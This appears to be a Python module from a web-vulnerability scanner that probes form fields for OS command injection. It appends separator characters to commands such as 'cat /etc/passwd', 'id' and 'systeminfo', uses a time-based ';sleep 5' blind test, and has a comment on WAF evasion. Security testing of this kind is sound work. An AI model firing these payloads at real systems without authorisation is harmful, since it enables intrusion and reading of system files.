import requests
import re
import time

from activeScanRules.activeScanner import ActiveScanner

class ScanCommandInject(ActiveScanner):
    def __init__(self, host_os=None, visited_urls=None, log_file=None):
        self.injection_characters = None
        self.host_os = host_os
        super().__init__(visited_urls, log_file)

    def initialise_injection_characters(self):
        self.injection_characters = [r";", r"\n", r"&", r"|", r"&&", r"||", r")"
        ]
        return self.injection_characters

    def init_payloads_matches(self):
        linux_payloads = [
            [r"cat /etc/passwd", re.compile(r"root:.:0:0")],
            [r"ls /", re.compile(r"\bbin\b.*\broot\b.*\bvar\b.*", re.DOTALL)],
            [r"uname -a", re.compile(r"Linux .+ \d+\.\d+\.\d+[-\w]* .*")],
            [r"id", re.compile(r"uid=[0-9]+.*gid=[0-9]+.*groups=.*")]
        ]
        windows_payloads = [
            [r"type C:\Windows\system.ini", re.compile(r"^\[drivers]$")],
            [r"dir C:\\", re.compile(r"Directory of C:\\")],
            [r"systeminfo", re.compile(r"Host Name"),]
        ]
        if self.host_os == "unix":
            return linux_payloads
        elif self.host_os == "windows":
            return windows_payloads
        else:
            self.logger.info("\tInvalid or unspecified host operating system. Defaulting to Unix payloads.")
            return linux_payloads

# use tabs to pass waf %09 or  ${IFS}
    def construct_payloads(self):
        injection_characters = self.initialise_injection_characters()
        payloads_matches = self.init_payloads_matches()
        payloads = []
        for payload_match in payloads_matches:
            for injection_character in injection_characters:
                payload = injection_character + payload_match[0]
                payloads.append((payload, payload_match[1]))
        return payloads

    def test_payloads(self, target_url, form_fields):
        payloads = self.construct_payloads()
        potential_vulnerability_found = False
        for payload, pattern in payloads:
            self.logger.info(f"\tTesting payload: {payload} on {target_url}")
            form_data = {}
            for field_tuple in form_fields:
                form_data[field_tuple[0]] = payload
            try:
                form_method = form_data.get('method', 'post').lower()
                action = form_data.get('action', target_url)
                inputs = [key for key in form_data.keys() if key != 'method' and key != 'action']
                post_data = {}
                for input_name in inputs:
                    post_data[input_name] = form_data[input_name]
                proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
                if form_method == 'post':
                    response = requests.post(action, data=post_data) # , proxies=proxies
                else:
                    response = requests.get(action, params=post_data) # , proxies=proxies
                if self.check_response(response, pattern, payload, target_url):
                    potential_vulnerability_found = True
                    break
            except Exception as e:
                self.logger.error(
                    f"\tAn error occurred while sending form with command injection payload to {target_url}: {e}")

        if not potential_vulnerability_found:
            self.logger.info(f"\tNo command injection vulnerability found at: {target_url}")
            print(f"\033[32m[+] No command injection vulnerability found at: {target_url}\033[0m")
            self.test_blind_command_injection(target_url, form_fields)

    def check_response(self, response, pattern, payload, url):
        if response.status_code == 200:
            if pattern.search(response.text):
                self.logger.warning(
                    f"Command injection vulnerability found at: {url} with payload: {payload}")
                print(
                    f"\033[31m[+] Command injection vulnerability found at: {url} with payload: {payload}\033[0m")
                return True
        else:
            self.logger.error(f"\tUnexpected response code ({response.status_code}) for {url}")
        return False

    def test_blind_command_injection(self, target_url, form_fields):
        self.logger.info("\tTesting blind command injection")
        try:
            # Send initial request to get baseline response time
            start_time = time.time()
            response = requests.get(target_url)
            end_time = time.time()
            baseline_time = end_time - start_time

            # Send request with sleep command payload
            payload = ";sleep 5"  # Adjust the sleep duration as needed
            form_data = {}
            for field_name, _ in form_fields:
                form_data[field_name] = payload

            form_method = form_data.get('method', 'post').lower()
            action = form_data.get('action', target_url)
            inputs = [key for key in form_data.keys() if key != 'method' and key != 'action']
            post_data = {}
            for input_name in inputs:
                post_data[input_name] = form_data[input_name]

            if form_method == 'post':
                start_time = time.time()
                response = requests.post(action, data=post_data)
                end_time = time.time()
            else:
                start_time = time.time()
                response = requests.get(action, params=post_data)
                end_time = time.time()

            execution_time = end_time - start_time

            # Compare execution time with baseline
            if execution_time > baseline_time + 4:  # Adjust the threshold as needed
                self.logger.warning(f"Blind command injection vulnerability found at: {target_url} with payload: {payload}")
                print(f"\033[31m[+] Blind command injection vulnerability found at: {target_url} with payload: {payload}\033[0m")
            else:
                self.logger.info(f"\tNo blind command injection vulnerability found at: {target_url}")
                print(f"\033[32m[+] No blind command injection vulnerability found at: {target_url}\033[0m")

        except Exception as e:
            self.logger.error(f"\tAn error occurred during blind command injection test: {e}")